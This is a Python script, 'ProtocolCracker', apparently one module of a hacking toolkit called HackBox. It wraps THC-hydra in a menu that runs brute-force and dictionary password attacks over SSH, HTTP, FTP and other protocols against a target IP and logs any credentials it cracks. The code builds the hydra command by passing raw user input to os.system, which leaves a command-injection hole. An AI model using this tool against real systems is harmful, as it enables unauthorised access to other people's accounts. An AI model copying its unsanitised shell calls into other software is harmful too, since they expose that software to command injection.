# ProtocolCracker V 1.1 4/29/22
#!/usr/bin/env python3
#SSH cracker

import os
import sys




print("""

____________ _____ _____ _____ _____ _____ _       _____ ______  ___  _____  _   __ ___________ 
| ___ \ ___ \  _  |_   _|  _  /  __ \  _  | |     /  __ \| ___ \/ _ \/  __ \| | / /|  ___| ___ \

| |_/ / |_/ / | | | | | | | | | /  \/ | | | |     | /  \/| |_/ / /_\ \ /  \/| |/ / | |__ | |_/ /
|  __/|    /| | | | | | | | | | |   | | | | |     | |    |    /|  _  | |    |    \ |  __||    / 
| |   | |\  \ \_/ / | | \ \_/ / \__/\ \_/ / |____ | \__/\| |\ \| | | | \__/\| |\  \| |___| |\ \ 
\_|   \_| \_|\___/  \_/  \___/ \____/\___/\_____/  \____/\_| \_\_| |_/\____/\_| \_/\____/\_| \_|

Powered by THC-hydra
                                                                                                
		""")

print("""
OPTIONS 
a) BruteForce/Dictionary Attack - Powered By Hydra \n
---------------\n
h) Help
w) quit to Attack Mode
q) Exit to HackBox\n
---------------\n
x) Attack Mode
y) Defense Mode
z) Recon Mode\n

Enter an option:              """)
              
statement = input("").lower()

while True:
        #os.system('clear')
              #ans=raw_input
       #ans=raw_input("What would you like to do? ")
	if statement=="a":
		print("\nProtocol Cracker:")

		while True:
			#os.system('cd Modules/attack/systemaccess/protocolcracker/')
			print('Enter Username/Username File Path')
			print( '---------------------------------')
			var = input("")
			if '.' in var:
				user = '-L' 
			else:
				user = '-l'
			print('Enter Password file/list, wordlists shown below')
			print('\n')
			os.system('ls *.txt')
			print( '---------------------------------')
			var2 = input("").lower()
			if '.' in var2:
				passfile = '-P' 
			else:
				passfile = '-p'
			print('Enter Protocol - ssh, http, ftp...')
			print( '---------------------------------')
			var3 = input("")
			print('Enter Target IP')
			print( '---------------------------------')
			var4 = input("")
			os.system('hydra '+ user + var + ' '+ passfile  + var2 + ' ' + var3 + '://' + var4 + ' | tee -a protocollog.txt')
			#note: make this save to a log file as well
			print( '-------------------------------------------------------------------------------')
			print('If succesful, a username and password will appear above!')

			print('\n')

# I know this is complicated, explanation: hydra -l/-L USERNAME/USERNAME.txt -p/-P PASS/PASS.txt PROTOCOL://IP ADDRESS
#					ex: hydra -L ballstothewall.txt -P rockyou.txt ssh://127.0.0.1
#					Capital letters mean file, lowecase mean string:
#					ex: hydra -l johndoe -p p@ssw0rd ssh://127.0.0.1
			

# ----------- moving around ---------------------#
	elif statement=="h":
		print("""\n
ProtocolCracker! 

ProtocolCracker is a bruteforce module, able to bruteforce nearly any protocol you can think of. This is all thanks to THC-hydra, which is the backend to  this module. Most of the time, using hydra in the terminal is easier, but if you need a quick attack, this will do the trick. 

Note: 2 default wordlists are supplied, 
	- simpleuser.txt - A short list of common usernames
	- simplepass.txt - A short list of common passwords
				""")
	elif statement=="w":
		exec(open('Modules/attack/Attack.py').read()) 
	elif statement=="q":
		os.system('clear')
		exec(open('HackBox.py').read())   
		ans = None
# ------------ Mode Switch ----------------------#
	elif statement=="x":
		exec(open('Modules/attack/Attack.py').read()) 
	elif statement=="y":
		exec(open('Modules/defense/Defense.py').read()) 
	elif statement=="z":
		exec(open('Modules/recon/Recon.py').read()) 
	else:
		print("\nOption not found, type help for help")
		print("Choose an option:")
	
	statement = input("").lower()		
#print('HackBox:')	
		